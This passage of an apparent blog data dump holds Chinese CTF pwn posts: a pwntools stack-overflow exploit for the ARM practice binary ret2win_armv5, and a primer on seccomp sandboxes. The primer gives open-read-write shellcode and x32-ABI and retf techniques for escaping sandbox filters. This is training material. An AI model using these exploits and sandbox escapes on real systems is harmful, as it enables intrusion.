import*\ncontext(log_level='debug',os='linux',arch='arm')\nfilename='ret2win_armv5'\nelf=ELF('./'+filename)\n#libc=ELF('')\n# p=process('./'+filename)\np=process([\"qemu-arm\", \"-L\", \"/usr/arm-linux-gnueabi/\", \"./\"+filename])\n#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})\n#p=remote('',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n\nret2win=0x000105EC \nr()\npayload=b'a'*0x24+p32(ret2win)\ns(payload)\n\nitr()\n\n```\n\n","source":"_posts/ret2win_asmv5.md","raw":"---\ntitle: ret2win_armv5\ndate: 2023-03-23 17:35:17\ncategories: \n- pwn_wp\ntags: \n- pwn\n- arm\n- stackoverflow\n\n\n---\n\narm pwn入门题，arm下的ret2text。\n<!-- more -->\n\n### 查壳\n\n```sh\n# 32位动态链接\nret2win_armv5: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=a82dade296415721f90684517d0e6259d4ba2905, not stripped\n\n# 只开了NX\n[*] '/home/a1ph0nse/PwnPractice/OwnStudy/ARMpwn/ret2win_armv5/ret2win_armv5'\n    Arch:     arm-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x10000)\n\n```\n\n### 逆向\n\n程序比较简单，在`pwnme`中有一个栈溢出，可以溢出`20byte`，存在一个`ret2win`的后面，控制返回到它就可以了。\n\n### exp\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='arm')\nfilename='ret2win_armv5'\nelf=ELF('./'+filename)\n#libc=ELF('')\n# p=process('./'+filename)\np=process([\"qemu-arm\", \"-L\", \"/usr/arm-linux-gnueabi/\", \"./\"+filename])\n#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})\n#p=remote('',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n\nret2win=0x000105EC \nr()\npayload=b'a'*0x24+p32(ret2win)\ns(payload)\n\nitr()\n\n```\n\n","slug":"ret2win_asmv5","published":1,"updated":"2023-03-23T09:43:12.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czagh005p5oudg2lq8t41","content":"<p>arm pwn入门题，arm下的ret2text。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"查壳\"><a href=\"#查壳\" class=\"headerlink\" title=\"查壳\"></a>查壳</h3><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 32位动态链接</span></span><br><span class=\"line\">ret2win_armv5: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, <span class=\"keyword\">for</span> GNU/Linux 3.2.0, BuildID[sha1]=a82dade296415721f90684517d0e6259d4ba2905, not stripped</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 只开了NX</span></span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/a1ph0nse/PwnPractice/OwnStudy/ARMpwn/ret2win_armv5/ret2win_armv5&#x27;</span></span><br><span class=\"line\">    Arch:     arm-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x10000)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"逆向\"><a href=\"#逆向\" class=\"headerlink\" title=\"逆向\"></a>逆向</h3><p>程序比较简单，在<code>pwnme</code>中有一个栈溢出，可以溢出<code>20byte</code>，存在一个<code>ret2win</code>的后面，控制返回到它就可以了。</p>\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;arm&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;ret2win_armv5&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&#x27;&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\">p=process([<span class=\"string\">&quot;qemu-arm&quot;</span>, <span class=\"string\">&quot;-L&quot;</span>, <span class=\"string\">&quot;/usr/arm-linux-gnueabi/&quot;</span>, <span class=\"string\">&quot;./&quot;</span>+filename])</span><br><span class=\"line\"><span class=\"comment\">#p=process([&#x27;./ld-2.23.so&#x27;,&#x27;./&#x27;+filename],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;&#x27;,)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\"></span><br><span class=\"line\">ret2win=<span class=\"number\">0x000105EC</span> </span><br><span class=\"line\">r()</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x24</span>+p32(ret2win)</span><br><span class=\"line\">s(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<p>arm pwn入门题，arm下的ret2text。</p>","more":"<h3 id=\"查壳\"><a href=\"#查壳\" class=\"headerlink\" title=\"查壳\"></a>查壳</h3><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 32位动态链接</span></span><br><span class=\"line\">ret2win_armv5: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, <span class=\"keyword\">for</span> GNU/Linux 3.2.0, BuildID[sha1]=a82dade296415721f90684517d0e6259d4ba2905, not stripped</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 只开了NX</span></span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/a1ph0nse/PwnPractice/OwnStudy/ARMpwn/ret2win_armv5/ret2win_armv5&#x27;</span></span><br><span class=\"line\">    Arch:     arm-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x10000)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"逆向\"><a href=\"#逆向\" class=\"headerlink\" title=\"逆向\"></a>逆向</h3><p>程序比较简单，在<code>pwnme</code>中有一个栈溢出，可以溢出<code>20byte</code>，存在一个<code>ret2win</code>的后面，控制返回到它就可以了。</p>\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;arm&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;ret2win_armv5&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&#x27;&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\">p=process([<span class=\"string\">&quot;qemu-arm&quot;</span>, <span class=\"string\">&quot;-L&quot;</span>, <span class=\"string\">&quot;/usr/arm-linux-gnueabi/&quot;</span>, <span class=\"string\">&quot;./&quot;</span>+filename])</span><br><span class=\"line\"><span class=\"comment\">#p=process([&#x27;./ld-2.23.so&#x27;,&#x27;./&#x27;+filename],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;&#x27;,)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\"></span><br><span class=\"line\">ret2win=<span class=\"number\">0x000105EC</span> </span><br><span class=\"line\">r()</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x24</span>+p32(ret2win)</span><br><span class=\"line\">s(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"Sandbox的基础知识","date":"2023-01-01T16:01:20.000Z","_content":"Sandbox的基础知识\n<!--more-->\n\n## Sandbox\n\n[https://www.cnblogs.com/L0g4n-blog/p/12839171.html]\n\n沙箱(Sandbox)是程序中的一种隔离机制，其目的是**限制不可信进程和不可信代码的访问权限**。\n\nseccomp是内核中的一种安全机制，seccomp可以在程序中**禁用掉一些系统调用**来达到保护系统安全的目的，seccomp规则的设置，可以使用prctl函数和seccomp函数族。\n\nprctl()函数：\n\nprctl是基本的进程管理函数，最原始的沙箱规则就是通过prctl函数来实现的，它可以**决定有哪些系统调用函数可以被调用，哪些系统调用函数不能被调用**。\n\n```c\nint prctl(int option,unsigned long argv2,unsigned long argv3,unsigned long argv4，unsigned long argv5)\n```\n\n参数option是选项，表示你要干什么，后面的参数都是对该option的辅助。\n\n参数option需要重点关注的有：\n\n- PR_SET_SECCOMP(也就是22):当第一个参数是PR_SET_SECCOMP,第二个参数**argv2为1**的时候，表示允许的系统调用有**read，write，exit和sigereturn**；当**argv2等于2**的时候，表示允许的系统调用**由argv3指向sock_fprog结构体定义**，该结构体成员指向的sock_filter可以定义过滤任意系统调用和系统调用参数。\n- PR_SET_NO_NEWPRIVS(也就是38):prctl(38,1,0,0,0)表示禁用系统调用execve()函数，同时，这个选项可以通过fork()函数和clone()函数**继承给子进程**。\n\n## 绕过沙箱\n\n### orw\n\n一般最普通的沙箱都是禁用了`execve`类的函数，这将会导致我们无法使用`one_gadget`和`system(\"/bin/sh\\x00\")`来get shell。但是pwn的最终结果并不是要求我们get shell，而是要求我们能拿到flag，所以我们可以面向flag编程，使用`open -> read -> write`来打开，读取最后输出flag。\n\n`orw`过程的实现可以是通过**ROP**链的`orw`，也可以是通过**shellcode**的`orw`，甚至可以使用`shellcraft.cat(\"./flag\\x00\")`原理上都是一样的。\n\n```py\nshellcode=asm(\n    '''\n    mov rax, 0x67616c662f\n    push rax\n    \n    push 0x2\n    pop rax\n    mov rdi, rsp\n    mov rdx, 0x440\n    xor rsi, rsi\n    syscall\n\n    mov rdi, rax\n    sub rsp, rdx\n    mov rsi, rsp\n    xor rax, rax\n    syscall\n\n    mov rdx, rax\n    push 0x2\n    pop rdi\n    push 0x1\n    pop rax\n    syscall \n    \n    '''\n)\n```\n\n### 利用x32ABI\n\n当`orw`的系统调用均不可行时，可以利用64位系统对32位程序的支持来实现`orw`。\n\n`x32 ABI`是ABI (Application Binary Interface)，同样也是linux系统内核接口之一。x32 ABI允许在64位架构下（包括指令集、寄存器等）使用32位指针。\n\n`x32 ABI`与64位下的系统调用方法几乎无异（一样走syscall），只不过系统调用号都是不小于**0x40000000**，并且要求使用32位指针。\n\n部分沙箱会缺少对`X32 ABI`的限制\n\n```sh\n 0003: 0x35 0x05 0x00 0x40000000  if (A >= 0x40000000) goto ALLOW # 允许sys_number>=0x40000000\n```\n\n具体的调用表可以查看系统头文件中的`/usr/src/linux-headers-$version-generic/arch/x86/include/generated/uapi/asm/unistd_x32.h`，大致如下：\n\n```c\n// #define __X32_SYSCALL_BIT\t0x40000000\n\n#ifndef _UAPI_ASM_UNISTD_X32_H\n#define _UAPI_ASM_UNISTD_X32_H\n\n#define __NR_read (__X32_SYSCALL_BIT + 0)\n#define __NR_write (__X32_SYSCALL_BIT + 1)\n#define __NR_open (__X32_SYSCALL_BIT + 2)\n#define __NR_close (__X32_SYSCALL_BIT + 3)\n\n...\n\n#endif /* _UAPI_ASM_UNISTD_X32_H */\n```\n\n因此这里我们就可以利用`0x40000002`的`open`来补上`orw`缺少的`open`。\n\n### 利用32位模式\n\n32位模式即64位系统下运行32位程序的模式，此时**CS寄存器的值为0x23**。在该模式下，程序与在32位系统中运行几乎无异，即只能使用32位寄存器，所有指针必须为32位，指令集为32位指令集等。\n\n与之相对地，**64位模式对应的CS寄存器的值为0x33**。\n\n进入32位模式需要更改CS寄存器为0x23。retf (far return) 指令可以帮助我们做到这一点。retf指令相当于：\n\n```asm\npop ip # 下一条指令\npop cs # 修改cs寄存器\n```\n\n需要注意的是，在使用pwntools构造shellcode时，需要指定retf的地址长度，即可以使用retfd和retfq。\n\n因为进入32位模式后，sp, ip寄存器也会变成32位，所以需要将**栈迁移至32位地址上**；利用或构造32位地址的RWX内存段，写入**32位shellcode**；最后在栈上构造fake ip, cs，执行**retf**指令。\n\n利用前提：\n\n- 沙箱中不包含对arch==ARCH_x86_64的检测\n- 存在或可构造32位地址的RWX内存段\n\n其中，构造RWX内存段可使用mmap申请新的内存，或使用mprotect使已有的段变为RWX权限。\n\n### 其他\n\n","source":"_posts/sandbox.md","raw":"---\ntitle: Sandbox的基础知识\ndate: 2023-01-02 00:01:20\ncategories: \n- pwn\ntags: \n- pwn\n- sandbox\n---\nSandbox的基础知识\n<!--more-->\n\n## Sandbox\n\n[https://www.cnblogs.com/L0g4n-blog/p/12839171.html]\n\n沙箱(Sandbox)是程序中的一种隔离机制，其目的是**限制不可信进程和不可信代码的访问权限**。\n\nseccomp是内核中的一种安全机制，seccomp可以在程序中**禁用掉一些系统调用**来达到保护系统安全的目的，seccomp规则的设置，可以使用prctl函数和seccomp函数族。\n\nprctl()函数：\n\nprctl是基本的进程管理函数，最原始的沙箱规则就是通过prctl函数来实现的，它可以**决定有哪些系统调用函数可以被调用，哪些系统调用函数不能被调用**。\n\n```c\nint prctl(int option,unsigned long argv2,unsigned long argv3,unsigned long argv4，unsigned long argv5)\n```\n\n参数option是选项，表示你要干什么，后面的参数都是对该option的辅助。\n\n参数option需要重点关注的有：\n\n- PR_SET_SECCOMP(也就是22):当第一个参数是PR_SET_SECCOMP,第二个参数**argv2为1**的时候，表示允许的系统调用有**read，write，exit和sigereturn**；当**argv2等于2**的时候，表示允许的系统调用**由argv3指向sock_fprog结构体定义**，该结构体成员指向的sock_filter可以定义过滤任意系统调用和系统调用参数。\n- PR_SET_NO_NEWPRIVS(也就是38):prctl(38,1,0,0,0)表示禁用系统调用execve()函数，同时，这个选项可以通过fork()函数和clone()函数**继承给子进程**。\n\n## 绕过沙箱\n\n### orw\n\n一般最普通的沙箱都是禁用了`execve`类的函数，这将会导致我们无法使用`one_gadget`和`system(\"/bin/sh\\x00\")`来get shell。但是pwn的最终结果并不是要求我们get shell，而是要求我们能拿到flag，所以我们可以面向flag编程，使用`open -> read -> write`来打开，读取最后输出flag。\n\n`orw`过程的实现可以是通过**ROP**链的`orw`，也可以是通过**shellcode**的`orw`，甚至可以使用`shellcraft.cat(\"./flag\\x00\")`原理上都是一样的。\n\n```py\nshellcode=asm(\n    '''\n    mov rax, 0x67616c662f\n    push rax\n    \n    push 0x2\n    pop rax\n    mov rdi, rsp\n    mov rdx, 0x440\n    xor rsi, rsi\n    syscall\n\n    mov rdi, rax\n    sub rsp, rdx\n    mov rsi, rsp\n    xor rax, rax\n    syscall\n\n    mov rdx, rax\n    push 0x2\n    pop rdi\n    push 0x1\n    pop rax\n    syscall \n    \n    '''\n)\n```\n\n### 利用x32ABI\n\n当`orw`的系统调用均不可行时，可以利用64位系统对32位程序的支持来实现`orw`。\n\n`x32 ABI`是ABI (Application Binary Interface)，同样也是linux系统内核接口之一。x32 ABI允许在64位架构下（包括指令集、寄存器等）使用32位指针。\n\n`x32 ABI`与64位下的系统调用方法几乎无异（一样走syscall），只不过系统调用号都是不小于**0x40000000**，并且要求使用32位指针。\n\n部分沙箱会缺少对`X32 ABI`的限制\n\n```sh\n 0003: 0x35 0x05 0x00 0x40000000  if (A >= 0x40000000) goto ALLOW # 允许sys_number>=0x40000000\n```\n\n具体的调用表可以查看系统头文件中的`/usr/src/linux-headers-$version-generic/arch/x86/include/generated/uapi/asm/unistd_x32.h`，大致如下：\n\n```c\n// #define __X32_SYSCALL_BIT\t0x40000000\n\n#ifndef _UAPI_ASM_UNISTD_X32_H\n#define _UAPI_ASM_UNISTD_X32_H\n\n#define __NR_read (__X32_SYSCALL_BIT + 0)\n#define __NR_write (__X32_SYSCALL_BIT + 1)\n#define __NR_open (__X32_SYSCALL_BIT + 2)\n#define __NR_close (__X32_SYSCALL_BIT + 3)\n\n...\n\n#endif /* _UAPI_ASM_UNISTD_X32_H */\n```\n\n因此这里我们就可以利用`0x40000002`的`open`来补上`orw`缺少的`open`。\n\n### 利用32位模式\n\n32位模式即64位系统下运行32位程序的模式，此时**CS寄存器的值为0x23**。在该模式下，程序与在32位系统中运行几乎无异，即只能使用32位寄存器，所有指针必须为32位，指令集为32位指令集等。\n\n与之相对地，**64位模式对应的CS寄存器的值为0x33**。\n\n进入32位模式需要更改CS寄存器为0x23。retf (far return) 指令可以帮助我们做到这一点。retf指令相当于：\n\n```asm\npop ip # 下一条指令\npop cs # 修改cs寄存器\n```\n\n需要注意的是，在使用pwntools构造shellcode时，需要指定retf的地址长度，即可以使用retfd和retfq。\n\n因为进入32位模式后，sp, ip寄存器也会变成32位，所以需要将**栈迁移至32位地址上**；利用或构造32位地址的RWX内存段，写入**32位shellcode**；最后在栈上构造fake ip, cs，执行**retf**指令。\n\n利用前提：\n\n- 沙箱中不包含对arch==ARCH_x86_64的检测\n- 存在或可构造32位地址的RWX内存段\n\n其中，构造RWX内存段可使用mmap申请新的内存，或使用mprotect使已有的段变为RWX权限。\n\n### 其他\n\n","slug":"sandbox","published":1,"updated":"2023-03-19T09:43:10.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czagi005t5oudhh9cargf","content":"<p>Sandbox的基础知识</p>\n<span id=\"more\"></span>\n\n<h2 id=\"Sandbox\"><a href=\"#Sandbox\" class=\"headerlink\" title=\"Sandbox\"></a>Sandbox</h2><p>[<a href=\"https://www.cnblogs.com/L0g4n-blog/p/12839171.html]\">https://www.cnblogs.com/L0g4n-blog/p/12839171.html]</a></p>\n<p>沙箱(Sandbox)是程序中的一种隔离机制，其目的是<strong>限制不可信进程和不可信代码的访问权限</strong>。</p>\n<p>seccomp是内核中的一种安全机制，seccomp可以在程序中<strong>禁用掉一些系统调用</strong>来达到保护系统安全的目的，seccomp规则的设置，可以使用prctl函数和seccomp函数族。</p>\n<p>prctl()函数：</p>\n<p>prctl是基本的进程管理函数，最原始的沙箱规则就是通过prctl函数来实现的，它可以<strong>决定有哪些系统调用函数可以被调用，哪些系统调用函数不能被调用</strong>。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">prctl</span><span class=\"params\">(<span class=\"type\">int</span> option,<span class=\"type\">unsigned</span> <span class=\"type\">long</span> argv2,<span class=\"type\">unsigned</span> <span class=\"type\">long</span> argv3,<span class=\"type\">unsigned</span> <span class=\"type\">long</span> argv4，<span class=\"type\">unsigned</span> <span class=\"type\">long</span> argv5)</span></span><br></pre></td></tr></table></figure>\n\n<p>参数option是选项，表示你要干什么，后面的参数都是对该option的辅助。</p>\n<p>参数option需要重点关注的有：</p>\n<ul>\n<li>PR_SET_SECCOMP(也就是22):当第一个参数是PR_SET_SECCOMP,第二个参数<strong>argv2为1</strong>的时候，表示允许的系统调用有<strong>read，write，exit和sigereturn</strong>；当<strong>argv2等于2</strong>的时候，表示允许的系统调用<strong>由argv3指向sock_fprog结构体定义</strong>，该结构体成员指向的sock_filter可以定义过滤任意系统调用和系统调用参数。</li>\n<li>PR_SET_NO_NEWPRIVS(也就是38):prctl(38,1,0,0,0)表示禁用系统调用execve()函数，同时，这个选项可以通过fork()函数和clone()函数<strong>继承给子进程</strong>。</li>\n</ul>\n<h2 id=\"绕过沙箱\"><a href=\"#绕过沙箱\" class=\"headerlink\" title=\"绕过沙箱\"></a>绕过沙箱</h2><h3 id=\"orw\"><a href=\"#orw\" class=\"headerlink\" title=\"orw\"></a>orw</h3><p>一般最普通的沙箱都是禁用了<code>execve</code>类的函数，这将会导致我们无法使用<code>one_gadget</code>和<code>system(&quot;/bin/sh\\x00&quot;)</code>来get shell。但是pwn的最终结果并不是要求我们get shell，而是要求我们能拿到flag，所以我们可以面向flag编程，使用<code>open -&gt; read -&gt; write</code>来打开，读取最后输出flag。</p>\n<p><code>orw</code>过程的实现可以是通过<strong>ROP</strong>链的<code>orw</code>，也可以是通过<strong>shellcode</strong>的<code>orw</code>，甚至可以使用<code>shellcraft.cat(&quot;./flag\\x00&quot;)</code>原理上都是一样的。</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shellcode=asm(</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    mov rax, 0x67616c662f</span></span><br><span class=\"line\"><span class=\"string\">    push rax</span></span><br><span class=\"line\"><span class=\"string\">    </span></span><br><span class=\"line\"><span class=\"string\">    push 0x2</span></span><br><span class=\"line\"><span class=\"string\">    pop rax</span></span><br><span class=\"line\"><span class=\"string\">    mov rdi, rsp</span></span><br><span class=\"line\"><span class=\"string\">    mov rdx, 0x440</span></span><br><span class=\"line\"><span class=\"string\">    xor rsi, rsi</span></span><br><span class=\"line\"><span class=\"string\">    syscall</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    mov rdi, rax</span></span><br><span class=\"line\"><span class=\"string\">    sub rsp, rdx</span></span><br><span class=\"line\"><span class=\"string\">    mov rsi, rsp</span></span><br><span class=\"line\"><span class=\"string\">    xor rax, rax</span></span><br><span class=\"line\"><span class=\"string\">    syscall</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    mov rdx, rax</span></span><br><span class=\"line\"><span class=\"string\">    push 0x2</span></span><br><span class=\"line\"><span class=\"string\">    pop rdi</span></span><br><span class=\"line\"><span class=\"string\">    push 0x1</span></span><br><span class=\"line\"><span class=\"string\">    pop rax</span></span><br><span class=\"line\"><span class=\"string\">    syscall </span></span><br><span 